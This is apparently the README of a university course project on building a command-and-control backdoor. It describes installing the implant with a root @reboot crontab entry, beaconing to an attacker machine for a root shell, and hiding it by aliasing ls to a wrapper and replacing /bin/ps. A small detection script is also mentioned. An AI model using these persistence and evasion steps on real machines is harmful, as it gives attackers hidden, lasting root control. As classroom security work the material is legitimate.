# C S 378 - Command and Control Project (Donald and Vincent)

## Set Up

### Configure IP (IMPORTANT)

Edit the IP addresses in the **_config.py_** file to match the IP address of the attacker and target machine. Can also set which port number the attacker machine will use to listen.

### Creating executables (IMPORTANT)

To create the attacker and backdoor executable things, run the make file. One file named 'attacker'
and another file named 'backdoor' should be created.

This must be done for the configured IP to work.

### Setting Up and Running Backdoor 

#### Installing necessary packages (on week 4)

Run the following commands as root on the week 4 machine:

sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*

sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*

sudo yum install -y python3

python3 -m pip install pexpect

python3 -m pip install -U pip setuptools

python3 -m pip install cryptography

#### Creating reboot cronjob 

Place the 'backdoor' executable in the /bin directory of the target machine.

Run **_chmod 755 backdoor_** to give execute permissions.

Run the command **_sudo crontab -e_**

Scroll to the bottom (after all #) and add the line: **_@reboot python3 /bin/backdoor &_**

Reboot the system (**_sudo reboot_**), cronjob should run every restart. Backdoor should call out
to attacker machine every 10 seconds (can edit this amount of time in **_config.py_**).

### Setting Up Detection Evasion

#### ls

In the evasion_and_detection folder, there is an **_ls_custom_** file. Take that and put it into the target machine at **_/usr/bin/ls_custom_**.

Give **_ls_custom_** executing privileges by running: **_chmod 755 /usr/bin/ls_custom_**

Run **_echo "alias ls='/usr/bin/ls_custom'" >> /etc/profile_** followed by **_source /etc/profile_** to reload the shell and apply these changes. The **_source_** call isn't necessary as the next time there is a login to the shell, the updated code will run. This just allows you to test the code without having to log out and back in. 

Now, whenever **_ls_** is run, the wrapper should run instead of the original binary.

#### ps

Place the ***fake_ps*** file found in the evasion_and_detection folder into the **_/bin_** directory of the target machine

Run ***chmod 755 fake_ps***

Run ***mkdir /bin/orig*** to create a directory named **_orig_** in the **_/bin_** directory.

Place the original **_ps_** file from the **_/bin_** directory into the **_/bin/orig_** directory.

Rename the ***fake_ps*** file to **_ps_**

### Setting Up and Running Attacker

Place the 'attacker' executable on the attack machine.

Run **_chmod +x attacker_** to give execute permissions.

Run **_./attacker_** in the command line to run the file and wait for the connection to be initiated by the target machine.

Once connection is made, we should be running as the root user and are in root's directory (at least when testing on Kali machine as target)

### BONUS: Detection Script

In the evasion_and_detection folder, there is an **_detect.py_** file. To run it, put it into the target machine and execute it using the following command: **_python3 detect.py_**.

There is a customization option within the python file, which is what files to look in when searching for aliases. We've included several start-up files to search within, one of which actually contains the alias we used to execute the ls wrapper. However, the list of files can easily be modified to better suit your needs.
